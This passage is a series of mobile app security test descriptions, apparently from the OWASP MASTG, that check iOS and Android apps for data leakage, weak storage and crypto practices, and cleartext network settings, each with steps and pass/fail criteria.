    - Dynamic analysis works best when you interact extensively with the app. But even then there could be corner cases which are difficult or impossible to execute on every device. The results from this test therefore are likely not exhaustive.

## Steps

1. Install the app on a device (@MASTG-TECH-0056).
2. Monitor the logs with @MASTG-TECH-0060.
3. Open the app.
4. Navigate to the mobile app from which you wish to analyse the log output.
5. Close the app.

## Observation

The output should contain all logged data.

## Evaluation

The test case fails if you can find sensitive data inside the output.
## Insertion of Sensitive Data into Logs

## Overview

On the iOS platform, logging APIs like `NSLog`, `NSAssert`, `NSCAssert`, `print`, and `printf` can inadvertently lead to the leakage of sensitive information. Log messages are recorded in the console, and you can access them by using @MASTG-TECH-0060. Although other apps on the device cannot read these logs, direct logging is generally discouraged due to its potential for data leakage.

In this test, we will use static analysis to verify whether an app has any logging APIs which take sensitive data.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary and look for uses of logging APIs.

## Observation

The output should include the location of all logging functions. Check the decompiled code to verify if they receive sensitive data as input.

## Evaluation

The test case fails if you can find the use of logging APIs logging any sensitive data.
## Runtime Monitoring of Files Eligible for Backup

## Overview

This test logs every file written to the app's data container at `/var/mobile/Containers/Data/Application/$APP_ID` to identify which files are eligible for backup. Files stored in the `tmp` or `Library/Caches` subdirectories are not logged, as they are not backed up.

## Steps

1. Use runtime method hooking (see @MASTG-TECH-0095) and look for uses of file system APIs such as `open`, `fopen`, `NSFileManager`, or `FileHandle` that create or write files.
2. Exercise the app to trigger file creation and writing.

## Observation

The output should list every file the app opens that is eligible for backup.

## Evaluation

The test case fails if any sensitive files are found in the output.
## Data Protection Classes for Files in Private Storage

## Overview

This test retrieves the data protection classes of files created or modified in the app's private storage during typical app usage. The goal is to ensure that files containing sensitive data are assigned appropriate data protection classes to safeguard them when the device is locked.

## Steps

1. Ensure the device / simulator is in a clean state (no prior test artifacts). Terminate the app if running.
2. Launch and exercise the app to trigger typical workflows (authentication, profile loading, messaging, caching, offline usage, cryptographic operations).
3. Retrieve the list of files from the app's private storage (sandbox) directory tree (`/var/mobile/Containers/Data/Application/<UUID>/`) including the data protection classes (@MASTG-TECH-0059).

## Observation

The output should contain:

- List of files in private storage including at least path and data protection class.

## Evaluation

The test case fails if **files containing sensitive data** have the data protection class set to `NSFileProtectionNone`.
## References to APIs for Storing Unencrypted Data in Private Storage

## Overview

This test checks whether the app writes unencrypted sensitive data to private storage. It focuses on:

- APIs that persist data in the app sandbox directories, including Foundation `FileManager` methods, low-level POSIX and BSD file I/O calls and high-level APIs such as `UserDefaults`, Core Data and SQLite wrappers.
- Keychain APIs used to:
    - store sensitive data directly within the Keychain
    - manage keys from the Keychain (that could be used to encrypt data before writing to private storage).

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 and look for uses of file system APIs that create or write files.
2. Run a static analysis tool such as @MASTG-TOOL-0073 and look for uses of Keychain APIs.

## Observation

The output should contain:

- A list of locations where the app writes or may write data to private storage.
- A list of locations where the app uses Keychain APIs, including access control and accessibility attributes.

## Evaluation

The test case fails if the sensitive data is not encrypted before being written to private storage or the Keychain API isn't used to store the sensitive data.
## Runtime Use of APIs for Storing Unencrypted Data in Private Storage

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0300 and is designed to be used together with @MASTG-TEST-0302.

It uses runtime method hooking to identify if sensitive data is written unencrypted to private storage or directly in the Keychain by monitoring file and Keychain APIs.

Note that some of the target APIs route I/O through system daemons or otherwise avoid direct `open` and `write` syscalls, so you'll have to hook the relevant Objective C or Swift APIs rather than tracing syscalls only.

## Steps

1. Use runtime method hooking (see @MASTG-TECH-0095) and look for uses of file system APIs that create or write files.
2. Use runtime method hooking (see @MASTG-TECH-0095) and look for uses of Keychain APIs.
3. Exercise app features that could handle sensitive data (authentication flows, session establishment, offline caching, profile viewing/editing, cryptographic operations, secure messaging, payment, or token refresh logic).

## Observation

The output should contain:

- A list of calls to the relevant Keychain APIs
- A list of calls to the relevant File System APIs

## Evaluation

The test case fails if the sensitive data is not encrypted before being written to private storage or the Keychain API isn't used to store the sensitive data.

Determining whether data is encrypted when written to private storage may be challenging. However, by monitoring the APIs used for writing data and analyzing the data written, you can infer whether encryption is being applied based on the methods and libraries used. You'll have to correlate the data written to private storage with the APIs used to write it, as identified through runtime method hooking. You'll also have to correlate the File System APIs with the Keychain APIs to verify that they are used together to store sensitive data securely. Sensitive data can be stored securely in the Keychain or be encrypted using a key from the Keychain before being written to private storage.
## Sensitive Data Unencrypted in Private Storage Files

## Overview

This test is designed to complement @MASTG-TEST-0301. Instead of monitoring APIs during execution, it performs a differential analysis of the app's private storage by comparing snapshots taken before and after exercising the app. It also enumerates Keychain items created or modified during the session.

The goal is to identify new or modified files and determine whether they contain sensitive data in plaintext or trivially encoded form, and to identify new Keychain entries that may contain sensitive data or keys used for file encryption.

## Steps

1. Ensure the device / simulator is in a clean state (no prior test artifacts). Terminate the app if running.
2. Take an initial snapshot of the app's private storage (sandbox) directory tree (@MASTG-TECH-0052).
3. Take an initial snapshot of the Keychain items (@MASTG-TECH-0061). Optionally record attributes (accessible class, access control flags, etc).
4. Exercise app features that could handle sensitive data (authentication flows, session establishment, offline caching, profile viewing/editing, cryptographic operations, secure messaging, payment, or token refresh logic).
5. Take a second snapshot of the private storage directory tree.
6. Diff the two private storage snapshots to identify new, deleted, and modified files. For modified files, determine whether content changes involve potential sensitive values.
7. Take a second snapshot of the Keychain items
8. Diff the two Keychain snapshots to identify new, deleted, and modified items during the session using @MASTG-TECH-0061.

## Observation

The output should contain:

- List of new or modified files with: path, size, hash, inferred type, encoding/encryption status (plaintext / encoded / encrypted / unknown).
- List of new or modified Keychain entries.

## Evaluation

The test case fails if sensitive data appears in plaintext or trivially encoded in new or modified files.

Inspect the list of files and Keychain entries for sensitive data. Attempt to identify and decode data that has been encoded using methods such as base64 encoding, hexadecimal representation, URL-encoding, escape sequences, binary plist files, compressed archives like zip, wide characters and common data obfuscation methods such as xoring. Also consider identifying and decompressing compressed files such as tar or zip. These methods obscure but do not protect sensitive data.
## References to APIs for Storing Unencrypted Data in Shared Storage

## Overview

This test checks whether the app writes sensitive data unencrypted to storage locations in the app sandbox that are configured for sharing by enabling file sharing in the app's Info.plist using the `UIFileSharingEnabled` ("Application supports iTunes file sharing") and `LSSupportsOpeningDocumentsInPlace` ("Supports opening documents in place") keys set to `YES`.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary.

2. Search for APIs that indicate use of shared storage, for example:

      - [`documentDirectory`](https://developer.apple.com/documentation/foundation/filemanager/searchpathdirectory/documentdirectory) (commonly exposed via iTunes File Sharing / Files app)
      - `FileManager.default.urls(for:in:)` with `documentDirectory`
      - Direct path manipulation under `.../Documents` for write operations (`Data.write(to:)`, `String.write(to:)`, `NSFileHandle`, `NSOutputStream`)

3. Check the app's `Info.plist` (@MASTG-TECH-0058) for the `UIFileSharingEnabled` and `LSSupportsOpeningDocumentsInPlace` flags.

## Observation

The output should contain:

- A list of code locations that write (or could write) to shared storage.
- The state of `UIFileSharingEnabled` and `LSSupportsOpeningDocumentsInPlace`.

## Evaluation

The test case fails if:

- The app writes unencrypted sensitive data to `documentDirectory` (or equivalent shared storage path), and
- `Info.plist` enables user access to the Documents directory (`UIFileSharingEnabled` and/or `LSSupportsOpeningDocumentsInPlace`).

Note: `documentDirectory` by itself is not inherently insecure; the risk arises when sensitive data is stored there and exposed via file sharing or Files app access. In contrast, data stored in other locations within the app sandbox (e.g., `Library/Application Support`) with encryption, or in the Keychain cannot be accessed even if file sharing is enabled.
## References to Asymmetric Key Pairs Used For Multiple Purposes

## Overview

According to section "5.2 Key Usage" of [NIST SP 800-57 part 1 revision 5](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf), cryptographic keys should be assigned a specific purpose and used only for that purpose (e.g., encryption, integrity authentication, key wrapping, random bit generation, or digital signatures). For example, a key intended for encryption should not be used for signing.

On Android, asymmetric keys are commonly generated with [`java.security.KeyPairGenerator`](https://developer.android.com/reference/java/security/KeyPairGenerator) configured through [`android.security.keystore.KeyGenParameterSpec`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec).

The [`KeyGenParameterSpec.Builder`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder) constructor has two arguments: the `keystoreAlias` and `purposes`, a bitmask of allowed operations documented in [`android.security.keystore.KeyProperties`](https://developer.android.com/reference/android/security/keystore/KeyProperties).

- [`KeyProperties.PURPOSE_SIGN`](https://developer.android.com/reference/android/security/keystore/KeyProperties#PURPOSE_SIGN)
- [`KeyProperties.PURPOSE_VERIFY`](https://developer.android.com/reference/android/security/keystore/KeyProperties#PURPOSE_VERIFY)
- [`KeyProperties.PURPOSE_ENCRYPT`](https://developer.android.com/reference/android/security/keystore/KeyProperties#PURPOSE_ENCRYPT)
- [`KeyProperties.PURPOSE_DECRYPT`](https://developer.android.com/reference/android/security/keystore/KeyProperties#PURPOSE_DECRYPT)
- [`KeyProperties.PURPOSE_WRAP_KEY`](https://developer.android.com/reference/android/security/keystore/KeyProperties#PURPOSE_WRAP_KEY)

## Steps

1. Run static analysis (@MASTG-TECH-0014) on the app and look for key generation code for asymmetric keys.

## Observation

The output should contain a list of locations where asymmetric keys are created using `KeyGenParameterSpec.Builder` and the associated purposes.

## Evaluation

The test case fails if you find any keys used for multiple roles (groups of purposes).

Using the output, ensure that each key pair is restricted to exactly **one** of the following roles:

- Encryption/Decryption (`PURPOSE_ENCRYPT` / `PURPOSE_DECRYPT`)
- Signing/Verification (`PURPOSE_SIGN` / `PURPOSE_VERIFY`)
- Key Wrapping (`PURPOSE_WRAP_KEY`)

When reverse engineering the app, you will find the previously mentioned purpose constants combined into a single integer value. For example, a purpose value of `15` combines all four purposes, which is not acceptable:

(`PURPOSE_ENCRYPT` = 1) | (`PURPOSE_DECRYPT` = 2) | (`PURPOSE_SIGN` = 4) | (`PURPOSE_VERIFY` = 8) = 15

Acceptable purpose combinations are:

- (`PURPOSE_ENCRYPT` = 1) = 1
- (`PURPOSE_DECRYPT` = 2) = 2
- (`PURPOSE_SIGN` = 4) = 4
- (`PURPOSE_VERIFY` = 8) = 8
- `PURPOSE_WRAP_KEY` = 32
- (`PURPOSE_ENCRYPT` = 1) | (`PURPOSE_DECRYPT` = 2) = 3
- (`PURPOSE_SIGN` = 4) | (`PURPOSE_VERIFY` = 8) = 12
## Runtime Use of Asymmetric Key Pairs Used For Multiple Purposes

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0307, but it focuses on intercepting cryptographic operations rather than generating keys with multiple purposes.

Some of the relevant functions to intercept are:

- [`Cipher.init(int opmode, Key key, AlgorithmParameters params)`](https://developer.android.com/reference/javax/crypto/Cipher#init(int,%20java.security.Key,%20java.security.AlgorithmParameters)) where `opmode` is one of:
    - `Cipher.ENCRYPT_MODE`
    - `Cipher.DECRYPT_MODE`
    - `Cipher.WRAP_MODE`
    - `Cipher.UNWRAP_MODE`
- [`Signature.initSign(PrivateKey privateKey)`](https://developer.android.com/reference/java/security/Signature#initSign(java.security.PrivateKey))
- [`Signature.initVerify(PublicKey publicKey)`](https://developer.android.com/reference/java/security/Signature#initVerify(java.security.PublicKey))

## Steps

1. Execute a method trace (@MASTG-TECH-0033) targeting all functions that use an asymmetric key to perform cryptographic operations.

## Observation

The output should contain a list of all cryptographic operations together with their corresponding keys.

## Evaluation

The test case fails if you find any keys used for multiple roles.

Using the output, ensure that each key (or key pair) is restricted to exactly **one** of the following groups of operations:

- Encryption/Decryption (used in `Cipher` operations with `ENCRYPT_MODE` or `DECRYPT_MODE`)
- Signing/Verification (used in `Signature` operations)
- Key Wrapping (used in `Cipher` operations with `WRAP_MODE` or `UNWRAP_MODE`)
## Insecure Random API Usage

## Overview

iOS apps sometimes use insecure pseudorandom number generators (PRNGs) instead of cryptographically secure ones. This test case focuses on detecting the use of insecure alternatives such as the standard C library functions `rand`, `random`, and the `*rand48` family.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, or use runtime method hooking (see @MASTG-TECH-0095), and look for insecure random APIs.

## Observation

The output should contain a list of locations where insecure random APIs are used, including the function names and code locations where they are called.

## Evaluation

The test case fails if random numbers generated using insecure APIs are used in security-relevant contexts.

For each of the identified API uses, verify the context by decompiling or disassembling the code (see @MASTG-TECH-0076) to determine if the generated random values are used for security-relevant purposes, such as:

- Generating cryptographic keys, initialization vectors (IVs), or nonces
- Creating authentication tokens or session identifiers
- Generating passwords or PINs
- Any other security-relevant operations requiring unpredictability

Other uses of insecure random APIs unrelated to security (e.g., generating random delays, non-security-related identifiers, game mechanics) do not cause the test case to fail.
## References to Explicit Security Provider in Cryptographic APIs

## Overview

Android cryptography APIs based on the Java Cryptography Architecture (JCA) allow developers to specify a [security provider](https://developer.android.com/reference/java/security/Provider.html) when calling `getInstance` methods. However, explicitly specifying a provider can cause security issues and break compatibility because several providers have been deprecated or removed in recent versions. For example:

- Apps targeting Android 9 (API level 28) or above [fail when a provider is specified](https://android-developers.googleblog.com/2018/03/cryptography-changes-in-android-p.html).
- The _Crypto_ provider was deprecated in Android 7.0 (API level 24) and [removed in Android 9 (API level 28)](https://developer.android.com/about/versions/pie/android-9.0-changes-all#conscrypt_implementations_of_parameters_and_algorithms).
- The _BouncyCastle_ provider was [deprecated in Android 9 (API level 28) and removed in Android 12 (API level 31)](https://developer.android.com/about/versions/12/behavior-changes-all#bouncy-castle).

This test identifies cases where an app explicitly specifies a security provider when using JCA APIs that is not the default provider, `AndroidOpenSSL` ([Conscrypt](https://github.com/google/conscrypt)), which is actively maintained and should generally be used. It examines `getInstance` calls and flags any use of a named provider other than legitimate exceptions such as `KeyStore.getInstance("AndroidKeyStore")`.

## Steps

1. Run @MASTG-TECH-0014 with a tool such as @MASTG-TOOL-0110 on the app binary to look for calls to `getInstance` that explicitly specify a security provider.

## Observation

The output should contain a list of locations where a security provider is explicitly specified in `getInstance` calls.

## Evaluation

The test case fails if any `getInstance` call explicitly specifies a security provider other than `AndroidKeyStore` for `KeyStore` operations. Review each occurrence to determine whether the provider is actually required and whether its use could introduce security or compatibility issues on modern Android versions.
## References to APIs for Preventing Keyboard Caching of Text Fields

## Overview

This test verifies whether the target app prevents sensitive information entered into text fields from being cached by the system keyboard. On iOS, the keyboard may suggest previously entered text when typing in any app on the device.

The test checks whether UI elements such as `UITextField`, `UITextView`, and `UISearchBar` prevent keyboard caching by using one or more of the following attributes:

- Setting [`UITextAutocorrectionType`](https://developer.apple.com/documentation/uikit/uitextautocorrectiontype)
- Enabling [`isSecureTextEntry`](https://developer.apple.com/documentation/uikit/uitextinputtraits/issecuretextentry)
- Setting [`spellCheckingType`](https://developer.apple.com/documentation/uikit/uitextinputtraits/spellcheckingtype)

**Note:** By default, text input is eligible for keyboard caching, and an app does not need to explicitly set `UITextAutocorrectionType` when creating a text field. Additionally, the UI may be configured in a Storyboard. As a result, this test may miss many true positives. For complete coverage, using @MASTG-TEST-0314 is recommended.

**Note:** This test may produce false negatives if the app uses custom text input controls that do not rely on standard UIKit classes such as `UITextField` or `UITextView`, for example in custom UI frameworks or game engines, or if text entry is handled through nonstandard abstractions that prevent reliable observation of input traits at rest.

## Steps

1. Use @MASTG-TECH-0065 to reverse engineer the app.
2. Use @MASTG-TECH-0072 to look for references to APIs that set the relevant input attributes.
3. Use @MASTG-TECH-0076 to analyze the relevant code paths and determine the values assigned to these attributes.

## Observation

The output should contain a list of locations where the app:

- creates text input fields such as `UITextField`, `UITextView`, or `UISearchBar`, and
- explicitly configures input attributes that prevent keyboard caching for security sensitive text fields.

## Evaluation

The test case fails if any UI inputs that may handle sensitive values, for example usernames, passwords, email addresses, credit card numbers, or recovery codes, are eligible for keyboard caching. This occurs when:

- `isSecureTextEntry` is not enabled, or
- `autocorrectionType` is set to `default` or `yes`, or
- `spellCheckingType` is set to `default` or `yes`.

!!! note
    Depending on the app's threat model, some text fields may not require disabling spell checking. However, since enabling `isSecureTextEntry` implicitly disables both autocorrection and spell checking, and since explicit guarantees are otherwise limited, it is generally advisable to disable all three attributes for any text field that may handle sensitive information.
## Runtime Monitoring of Text Fields Eligible for Keyboard Caching

## Overview

This test complements @MASTG-TEST-0313. It monitors text inputs in the app at runtime, for example [`UITextField`](https://developer.apple.com/documentation/uikit/uitextfield), [`UITextView`](https://developer.apple.com/documentation/uikit/uitextview) or [`UISearchBar`](https://developer.apple.com/documentation/uikit/uisearchbar), and checks whether they are eligible for keyboard caching when the user enters sensitive information.

## Steps

1. Use @MASTG-TECH-0056 to install the app.
2. Use @MASTG-TECH-0067 to look for text input fields in the app's UI and identify those that use the relevant attributes.
3. Exercise the app thoroughly, entering realistic sensitive information (for example, usernames, passwords, email addresses, credit card numbers, recovery codes) into each identified input field.

## Observation

The output should allow the tester to associate each text entry with the corresponding input field and its protection status. At minimum it should contain:

- The input widget details, including class and accessibility identifier when available.
- The input traits relevant to keyboard caching, for example: `isSecureTextEntry`, `autocorrectionType`, `spellCheckingType`, and any other traits or flags that influence keyboard prediction or caching.
- The entered values so they can be correlated with sensitive information.

## Evaluation

The test case fails if any UI inputs that may handle sensitive values (for example, usernames, passwords, email addresses, credit card numbers, recovery codes) are eligible for keyboard caching. This occurs when:

- `isSecureTextEntry` is not enabled, or
- `autocorrectionType` is set to `default` or `yes`, or
- `spellCheckingType` is set to `default` or `yes`.

!!! note
    This test may produce false negatives if the app uses custom text input controls that do not rely on standard UIKit classes such as `UITextField` or `UITextView` (for example in custom UI frameworks or game engines), or if text entry is handled through nonstandard abstractions that prevent reliable observation of input traits at runtime.
## Sensitive Data Exposed via Notifications

## Overview

This test verifies that the app correctly handles notifications, ensuring that sensitive information, such as personally identifiable information (PII), one-time passwords (OTPs), or other sensitive data, like health or financial details, is not exposed.

On Android 13 and higher, apps targeting API level 33 or above must request the runtime permission [`POST_NOTIFICATIONS`](https://developer.android.com/reference/android/Manifest.permission#POST_NOTIFICATIONS) to send notifications. Below API level 33, this permission is not required. For testing purposes, we consider the value of the app's `minSdkVersion` because it indicates the lowest Android version on which the app can run.

Notifications can be created using the [`setContentTitle`](https://developer.android.com/reference/android/app/Notification.Builder#setContentTitle(java.lang.CharSequence)) and [`setContentText`](https://developer.android.com/reference/android/app/Notification.Builder#setContentText(java.lang.CharSequence)) methods of [`Notification.Builder`](https://developer.android.com/reference/android/app/Notification.Builder) or [`NotificationCompat.Builder`](https://developer.android.com/reference/androidx/core/app/NotificationCompat.Builder).

Notification usage should not expose sensitive information that could be disclosed accidentally, e.g., through shoulder surfing or when sharing the device with another person.

## Steps

1. Use @MASTG-TECH-0013 to reverse engineer the app.
2. Use @MASTG-TECH-0117 to obtain the AndroidManifest.xml file.
3. Use @MASTG-TECH-0014 to look for the declaration of the `POST_NOTIFICATIONS` permission and the `minSdkVersion` in the AndroidManifest.xml file.
4. Use @MASTG-TECH-0014 to look for references to notification APIs such as `NotificationCompat.Builder`, `setContentTitle`, or `setContentText` in the app's source code.

## Observation

The output should contain:

- the `POST_NOTIFICATIONS` permission, if declared,
- the value of `minSdkVersion`, and
- a list of locations where notification APIs are used.

## Evaluation

The test case fails if the app exposes any sensitive data in any notifications and either:

- `minSdkVersion` is `33` or higher and the `POST_NOTIFICATIONS` permission is declared in the manifest file, or
- `minSdkVersion` is `32` or lower, regardless of whether the `POST_NOTIFICATIONS` permission is declared.

**Why `minSdkVersion` and not `targetSdkVersion`?**: Using `minSdkVersion` ensures the test accounts for the **least secure environment** in which the app can operate, which is what determines the real exposure risk.

`targetSdkVersion` only influences how the app behaves on newer Android versions and how the system enforces newer platform restrictions. It does not change the behavior of older Android versions. As a result, an app with a high `targetSdkVersion` but a low `minSdkVersion` must still be evaluated against the security guarantees, or lack thereof, of those older versions.
## App Exposing User Authentication Data in Text Input Fields

## Overview

This test verifies that the app handles user input correctly, ensuring that access codes (passwords or pins) and verification codes (OTPs) are not exposed in plain text within text input fields.

Proper masking (e.g., dots instead of input characters) of these codes is essential to protect user privacy. This can be achieved by using appropriate input types that obscure the characters entered by the user. In Jetpack Compose, `SecureTextField` uses `TextObfuscationMode`, which [by default is `TextObfuscationMode.RevealLastTyped`](https://cs.android.com/androidx/platform/frameworks/support/+/androidx-main:compose/material/material/src/commonMain/kotlin/androidx/compose/material/SecureTextField.kt;l=115?q=SecureTextField), so a developer can simply use `SecureTextField` without explicitly setting `textObfuscationMode` unless another behavior is required.

XML view:

```xml
<EditText
    android:inputType="textPassword"
    ...
/>
```

Jetpack Compose:

```kotlin
SecureTextField(
    // textObfuscationMode defaults to TextObfuscationMode.RevealLastTyped
    textObfuscationMode = TextObfuscationMode.RevealLastTyped, // or TextObfuscationMode.Hidden
    ...
)
```

!!! note
    Even if `SecureTextField` uses the default `TextObfuscationMode.RevealLastTyped` or is configured explicitly with `RevealLastTyped` or `Hidden`, it can later be changed to `Visible` programmatically.

## Steps

1. Use @MASTG-TECH-0013 to reverse engineer the app.
2. Use @MASTG-TECH-0014 to look for references to the text field classes and text obfuscation APIs.
3. Manually evaluate and shortlist the fields for access or verification codes usage.

## Observation

The output should contain a list of locations where text input fields for access or verification codes are used.

## Evaluation

The test case fails if any text input field used for access or verification codes is found to be unmasked. For example, due to the following:

- `TextField` is used
- `SecureTextField` is used but configured with `TextObfuscationMode.Visible`

!!! note
    This test may produce false negatives if the app uses custom text input controls that do not rely on standard classes such as `TextField` or `SecureTextField` (for example in custom UI frameworks or game engines).
## References to SDK APIs Known to Handle Sensitive User Data

## Overview

This test verifies whether an app uses SDK (third-party library) APIs known to handle sensitive user data (e.g., as defined in [Google Play's Data safety section](https://support.google.com/googleplay/android-developer/answer/10787469?hl=en#types&zippy=%2Cdata-types) or the relevant privacy regulations).

As a prerequisite, we need to identify the SDK API methods it uses as entry points for data collection by reviewing the library's documentation or codebase. For example, [Google Analytics for Firebase](https://firebase.google.com/docs/analytics) in its class `FirebaseAnalytics` provides methods such as [`setUserId`](https://firebase.google.com/docs/reference/android/com/google/firebase/analytics/FirebaseAnalytics#setUserId(java.lang.String)), [`setUserProperty`](https://firebase.google.com/docs/reference/android/com/google/firebase/analytics/FirebaseAnalytics#setUserProperty(java.lang.String,%20java.lang.String)), and [`logEvent`](https://firebase.google.com/docs/reference/android/com/google/firebase/analytics/FirebaseAnalytics#logEvent(java.lang.String,%20android.os.Bundle)) that can be used to collect user data.

> Note: This test detects only **potential** sensitive user data handling. For **confirming** that actual user data are being shared, please refer to @MASTG-TEST-0319.

## Steps

1. Use @MASTG-TECH-0013 to reverse engineer the app.
2. Use @MASTG-TECH-0014 to look for uses of these methods where sensitive user data may be passed to the SDK.

## Observation

The output should list the locations where SDK methods are called.

## Evaluation

The test case fails if you can find the use of these SDK methods in the app code, indicating that the app is sharing sensitive user data with the third-party SDK.
## Runtime Use of SDK APIs Known to Handle Sensitive User Data

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0318.

## Steps

1. Use @MASTG-TECH-0033 to hook SDK methods known to handle sensitive user data.

## Observation

The output should list the locations where SDK methods are called, their stacktrace (call hierarchy leading to the call), and the arguments (values) passed to the SDK method at runtime.

## Evaluation

The test case fails if you can find sensitive user data being passed to these SDK methods in the app code, indicating that the app is sharing sensitive user data with the third-party SDK.
## WebViews Not Cleaning Up Sensitive Data

## Overview

This test verifies whether the app cleans up sensitive data used by WebViews. Apps can enable several specific storage areas in their WebViews and not clean them up properly, leading to sensitive data being stored on the device longer than necessary. For example:

- Not calling [`WebView.clearCache(includeDiskFiles = true)`](https://developer.android.com/reference/android/webkit/WebView#clearCache(boolean)) when:
    - `WebSettings.setAppCacheEnabled()` is enabled,
    - or [`WebSettings.setCacheMode()`](https://developer.android.com/reference/android/webkit/WebSettings#setCacheMode(int)) is any value other than [`WebSettings.LOAD_NO_CACHE`](https://developer.android.com/reference/kotlin/android/webkit/WebSettings#LOAD_NO_CACHE:kotlin.Int).
- Not calling [`WebStorage.deleteAllData()`](https://developer.android.com/reference/android/webkit/WebStorage#deleteAllData()) when:
    - [`WebSettings.setDomStorageEnabled`](https://developer.android.com/reference/android/webkit/WebSettings#setDomStorageEnabled(boolean)) is enabled.
- Not calling [`WebStorage.deleteAllData()`](https://developer.android.com/reference/android/webkit/WebStorage#deleteAllData()) when:
    - [`WebSettings.setDatabaseEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings#setDatabaseEnabled(boolean)) is enabled.
- Not calling [`CookieManager.removeAllCookies(ValueCallback<Boolean> ...)`](https://developer.android.com/reference/android/webkit/CookieManager#removeAllCookies(android.webkit.ValueCallback%3Cjava.lang.Boolean%3E)) when:
    - [`CookieManager.setAcceptCookie()`](https://developer.android.com/reference/android/webkit/CookieManager#setAcceptCookie(boolean)) is not explicitly set to `false` (default is set to `true`).

This test uses dynamic analysis to monitor the relevant API calls and file system operations. Regardless of whether the app uses these APIs directly, WebViews may use them internally when rendering content (e.g., JavaScript code using `localStorage`). So tracing calls to APIs such as `open`, `openat`, `opendir`, `unlinkat`, etc., can help identify file operations in the WebView storage directory.

## Steps

1. Install the app on a device (@MASTG-TECH-0005).
2. Use @MASTG-TECH-0033 to target WebView APIs for storage enablement and cleanup.
3. Open the app.
4. Use the app extensively to ensure that all relevant WebViews are covered and that sensitive data is loaded into them. Ensure you keep a list of the sensitive data you expect to be cleaned up.
5. Close the app.
6. Use @MASTG-TECH-0002 to pull the contents of the `/data/data/<app_package>/app_webview/` directory or simply search for the sensitive data used in the WebView within that directory.

## Observation

The output should include:

1. The list of WebView storage enablement APIs used.
2. The list of WebView storage cleanup APIs used.
3. The list of sensitive data expected to be cleaned up.
4. The result of searching the contents of the `/data/data/<app_package>/app_webview/` directory for the sensitive data used in the WebView after closing the app.

## Evaluation

The test case fails if the app still has sensitive data on the `/data/data/<app_package>/app_webview/` directory after the app is closed. This could be due to the app not calling the relevant cleanup APIs after using the WebView.

!!! note
    It can be challenging to determine whether the right cleanup APIs were called for the enabled storage areas. @MASTG-KNOW-0018 describes the storage areas used by WebViews and the challenges of evaluating their cleanup.

**Additional Guidance**:

If you need more introspection during runtime, you can rerun the test with additional tracing of file system operations in the WebView storage directory. See @MASTG-TECH-0143.
## Hardcoded HTTP URLs

## Overview

An iOS app may have hardcoded HTTP URLs embedded in the app binary, library binaries, or other resources within the IPA. These URLs may indicate potential locations where the app communicates with servers over an unencrypted connection.

## Steps

1. Use @MASTG-TECH-0065 to reverse engineer the app.
2. Use @MASTG-TECH-0071 to search for any `http://` URLs.

## Observation

The output should contain a list of URLs and their locations within the app.

## Evaluation

The test case fails if any HTTP URLs are confirmed to be used for communication.

!!! warning Limitations
    The presence of HTTP URLs alone does not necessarily mean they are actively used for communication. Their usage may depend on runtime conditions, such as how the URLs are invoked and whether cleartext traffic is allowed in the app's ATS configuration. For example, HTTP requests may fail if App Transport Security (ATS) is enabled and no exceptions are configured (see @MASTG-TEST-0322) or may succeed if the app uses low-level APIs that bypass ATS (see @MASTG-TEST-0322).

Additionally, complement this static inspection with dynamic testing methods. For example, capture and analyze network traffic to confirm whether the app connects to the identified HTTP URLs during real-world usage. See @MASTG-TEST-0236.
## App Transport Security Configurations Allowing Cleartext Traffic

## Overview

Since iOS 9 App Transport Security (ATS) blocks cleartext HTTP traffic by default for connections using the [URL Loading System](https://developer.apple.com/documentation/foundation/url_loading_system) (typically via `URLSession`). However, an app can still send cleartext traffic through several ATS exceptions configured in the `Info.plist` file under the `NSAppTransportSecurity` key.

The following configurations allow cleartext traffic:

- **`NSAllowsArbitraryLoads`**: When set to `true`, disables ATS restrictions globally except for individual domains specified under `NSExceptionDomains`. This allows all HTTP connections.
- **`NSAllowsArbitraryLoadsInWebContent`**: When set to `true`, disables ATS restrictions for all connections made from WebViews.
- **`NSAllowsArbitraryLoadsForMedia`**: When set to `true`, disables all ATS restrictions for media loaded through the AV Foundations framework.
- **`NSExceptionAllowsInsecureHTTPLoads`**: When set to `true` for a specific domain under `NSExceptionDomains`, allows HTTP connections to that domain.

For more information on ATS configuration, see @MASTG-KNOW-0071.

!!! warning Limitations
    ATS only applies to connections made via the [URL Loading System](https://developer.apple.com/documentation/foundation/url_loading_system). Lower-level APIs such as the [`Network`](https://developer.apple.com/documentation/network) framework or [`CFNetwork`](https://developer.apple.com/documentation/cfnetwork) are not affected by ATS settings and may still allow cleartext traffic regardless of the configuration. See @MASTG-TEST-0323 for more details.

## Steps

1. Extract the app (@MASTG-TECH-0058).
2. Obtain the `Info.plist` file from the app bundle.
3. Use @MASTG-TECH-0138 to convert the `Info.plist` to a readable format (if necessary).
4. Examine the `NSAppTransportSecurity` dictionary for cleartext traffic exceptions.

## Observation

The output should contain the ATS configuration, if present, including any exceptions that allow cleartext traffic.

## Evaluation

The test case fails if cleartext traffic is permitted. This can happen if **any** of the following conditions are met:

1. `NSAllowsArbitraryLoads = true` **only when** none of the fine-grained keys (2-4 below) are present (because on iOS 10+ they cause `NSAllowsArbitraryLoads` to be ignored).
2. `NSAllowsArbitraryLoadsInWebContent = true`.
3. `NSAllowsArbitraryLoadsForMedia = true`.
4. `NSAllowsLocalNetworking = true`.
5. Any domain under `NSExceptionDomains` sets `NSExceptionAllowsInsecureHTTPLoads = true`.

**Context Considerations**:

Note that ATS exceptions should be examined taking the app's context into consideration. The app may _have to_ define ATS exceptions to fulfill its intended purpose. For example, a browser app must connect to arbitrary websites, including those using HTTP. In such cases, the exception may be acceptable if a proper [justification string](https://developer.apple.com/documentation/security/preventing-insecure-network-connections#Provide-Justification-for-Exceptions) is provided. However, Apple recommends preferring server-side fixes over client-side ATS exceptions whenever possible.
## References to Root Detection Mechanisms

## Overview

This test checks whether the app implements root detection by statically analyzing the app binary for common root detection patterns. These may include checks for files and artifacts typically associated with rooted devices, as well as calls to known root detection APIs or libraries.

